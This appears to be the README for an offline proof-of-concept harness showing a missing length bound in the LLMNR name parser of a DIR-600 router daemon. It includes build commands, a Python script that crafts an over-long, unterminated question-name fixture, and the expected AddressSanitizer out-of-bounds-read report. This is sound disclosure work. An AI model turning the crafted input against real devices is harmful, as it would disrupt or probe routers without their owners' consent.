# RC-0006 — PoC: offline AddressSanitizer harness for the LLMNR name parser

This harness compiles the **unmodified** vendor parser helper (`get_name_size`
from GPL source file `rec_op.c`) in isolation and feeds it a crafted LLMNR
question-name buffer. It demonstrates the missing received-length bound
without touching any device.

## Files

- [`llmnr_asan_harness.c`](llmnr_asan_harness.c) — the harness. It stubs the
  daemon's surrounding symbols, pulls in the vendor's `rec_op.c` verbatim
  (`#define static` trick), reads a fixture file into an exactly-sized
  buffer, and calls the vendor-static `get_name_size(buffer + 12)` — mirroring
  how `llmnresp` hands datagram payload to the parser **without a length**.

## Prerequisites

You need two files from the vendor's **GPL source release** for the DIR-600
B5 `llmnresp` daemon (snapshot `c733941` was used here):

- `rec_op.c` (contains the vulnerable `get_name_size`)
- `llmnresp.h`

Place them next to the harness in this directory.

## Build

```sh
clang -g -fsanitize=address -I. llmnr_asan_harness.c rec_op.c -o rc0006-llmnr-asan
# or gcc -g -fsanitize=address ...
```

## Reproduce

**1. Valid query — clean exit.** A well-formed 25-byte LLMNR query
(12-byte header + 13 bytes of labels + terminating zero) parses without
findings.

**2. Boundary query — one-byte out-of-bounds read.** A 1472-byte fixture
(`MAX_V4UDP_PDU_SIZE`) whose label chain runs to the end of the buffer
without a terminating zero label:

```sh
python3 - <<'EOF'
import struct
q = b"\x00" * 12                      # LLMNR header
q += b"\x3f" + b"a" * 63              # label chain of maximal labels ...
while len(q) < 1472 - 1:
    q += b"\x3f" + b"a" * 63
q = q[:1472]                          # truncated: no terminating zero label
open("fixture_oob.bin", "wb").write(q)
EOF
./rc0006-llmnr-asan fixture_oob.bin
```

**Expected AddressSanitizer report** (from our verification run, addresses
elided):

```text
ERROR: AddressSanitizer: heap-buffer-overflow
READ of size 1
    #0 in get_name_size rec_op.c:41
0xADDR is located 12 bytes to the right of 1472-byte region
allocated by: main llmnr_asan_harness.c:63
SUMMARY: AddressSanitizer: heap-buffer-overflow rec_op.c:41 in get_name_size
```

## What this proves — and what it does not

- **Proven:** the vendor parser reads past the end of a datagram-sized
  allocation because no received-length bound is passed to
  `get_name_size`. The helper body is unmodified vendor code.
- **Not demonstrated, not claimed:** device denial of service or
  information disclosure. The memory-safety violation itself is the
  finding.
